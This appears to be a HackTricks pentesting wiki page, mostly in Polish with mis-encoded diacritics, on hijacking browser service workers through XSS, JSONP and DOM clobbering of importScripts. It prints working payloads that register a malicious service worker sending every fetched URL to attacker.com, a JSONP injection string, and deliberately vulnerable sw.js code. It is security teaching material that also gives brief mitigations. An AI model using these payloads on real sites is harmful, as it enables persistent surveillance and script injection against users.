# Abusing Service Workers

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the**  [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

**Service worker** to skrypt uruchamiany przez przegldark w tle, oddzielony od jakiejkolwiek strony internetowej, umo偶liwiajcy funkcje, kt贸re nie wymagaj strony internetowej ani interakcji u偶ytkownika, co zwiksza mo偶liwoci **pracy offline i w tle**. Szczeg贸owe informacje na temat service worker贸w mo偶na znale藕 [tutaj](https://developers.google.com/web/fundamentals/primers/service-workers). Wykorzystujc service workery w ramach podatnej domeny internetowej, atakujcy mog przej kontrol nad interakcjami ofiary ze wszystkimi stronami w tej domenie.

### Checking for Existing Service Workers

Istniejce service workery mo偶na sprawdzi w sekcji **Service Workers** w zakadce **Application** w **Narzdziach deweloperskich**. Inn metod jest odwiedzenie [chrome://serviceworker-internals](https://chromium.googlesource.com/chromium/src/+/main/docs/security/chrome%3A/serviceworker-internals) w celu uzyskania bardziej szczeg贸owego widoku.

### Push Notifications

**Uprawnienia do powiadomie push** bezporednio wpywaj na zdolno **service workera** do komunikacji z serwerem bez bezporedniej interakcji u偶ytkownika. Jeli uprawnienia s odrzucane, ogranicza to potencja service workera do stwarzania cigego zagro偶enia. Z drugiej strony, przyznanie uprawnie zwiksza ryzyko bezpieczestwa, umo偶liwiajc odbieranie i wykonywanie potencjalnych exploit贸w.

## Attack Creating a Service Worker

Aby wykorzysta t podatno, musisz znale藕:

* Spos贸b na **przesanie dowolnych plik贸w JS** na serwer oraz **XSS do zaadowania service workera** przesanego pliku JS
* **Podatne 偶danie JSONP**, w kt贸rym mo偶esz **manipulowa wyjciem (z dowolnym kodem JS)** oraz **XSS** do **zaadowania JSONP z adunkiem**, kt贸ry **zaaduje zoliwego service workera**.

W nastpujcym przykadzie zaprezentuj kod do **rejestrowania nowego service workera**, kt贸ry bdzie nasuchiwa zdarzenia `fetch` i **wyle do serwera atakujcego ka偶d pobran URL** (to jest kod, kt贸ry musisz **przesa** na **serwer** lub zaadowa za pomoc **podatnej odpowiedzi JSONP**):
```javascript
self.addEventListener('fetch', function(e) {
e.respondWith(caches.match(e.request).then(function(response) {
fetch('https://attacker.com/fetch_url/' + e.request.url)
});
```
I oto kod, kt贸ry **zarejestruje pracownika** (kod, kt贸ry powiniene by w stanie wykona, wykorzystujc **XSS**). W tym przypadku **偶danie GET** zostanie wysane do serwera **atakujcego**, **informujc**, czy **rejestracja** pracownika serwisowego bya udana, czy nie:
```javascript
<script>
window.addEventListener('load', function() {
var sw = "/uploaded/ws_js.js";
navigator.serviceWorker.register(sw, {scope: '/'})
.then(function(registration) {
var xhttp2 = new XMLHttpRequest();
xhttp2.open("GET", "https://attacker.com/SW/success", true);
xhttp2.send();
}, function (err) {
var xhttp2 = new XMLHttpRequest();
xhttp2.open("GET", "https://attacker.com/SW/error", true);
xhttp2.send();
});
});
</script>
```
W przypadku nadu偶ywania podatnego punktu kocowego JSONP, powiniene umieci warto wewntrz `var sw`. Na przykad:
```javascript
var sw = "/jsonp?callback=onfetch=function(e){ e.respondWith(caches.match(e.request).then(function(response){ fetch('https://attacker.com/fetch_url/' + e.request.url) }) )}//";
```
There is a **C2** dedicated to the **exploitation of Service Workers** called [**Shadow Workers**](https://shadow-workers.github.io) that will be very useful to abuse these vulnerabilities.

The **24-hour cache directive** limits the life of a malicious or compromised **service worker (SW)** to at most 24 hours after an XSS vulnerability fix, assuming online client status. To minimize vulnerability, site operators can lower the SW script's Time-To-Live (TTL). Developers are also advised to create a [**service worker kill-switch**](https://stackoverflow.com/questions/33986976/how-can-i-remove-a-buggy-service-worker-or-implement-a-kill-switch/38980776#38980776) for rapid deactivation.

## Abusing `importScripts` in a SW via DOM Clobbering

The function **`importScripts`** called from a Service Worker can **import a script from a different domain**. If this function is called using a **parameter that an attacker could** modify he would be able to **import a JS script from his domain** and get XSS.

**This even bypasses CSP protections.**

**Example vulnerable code:**

* **index.html**
```html
<script>
navigator.serviceWorker.register('/dom-invader/testcases/augmented-dom-import-scripts/sw.js' + location.search);
// attacker controls location.search
</script>
```
* **sw.js**
```javascript
const searchParams = new URLSearchParams(location.search);
let host = searchParams.get('host');
self.importScripts(host + "/sw_extra.js");
//host can be controllable by an attacker
```
### Z DOM Clobbering

Aby uzyska wicej informacji na temat tego, czym jest DOM Clobbering, sprawd藕:

{% content-ref url="dom-clobbering.md" %}
[dom-clobbering.md](dom-clobbering.md)
{% endcontent-ref %}

Jeli URL/domena, z kt贸rej SW korzysta, aby wywoa **`importScripts`**, znajduje si **wewntrz elementu HTML**, **mo偶liwe jest modyfikowanie go za pomoc DOM Clobbering**, aby SW **zaadowa skrypt z twojej wasnej domeny**.

Aby zobaczy przykad, sprawd藕 link referencyjny.

## Referencje

* [https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering](https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering)

{% hint style="success" %}
Ucz si i wicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz si i wicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie dla HackTricks</summary>

* Sprawd藕 [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel si trikami hackingowymi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytori贸w github.

</details>
{% endhint %}
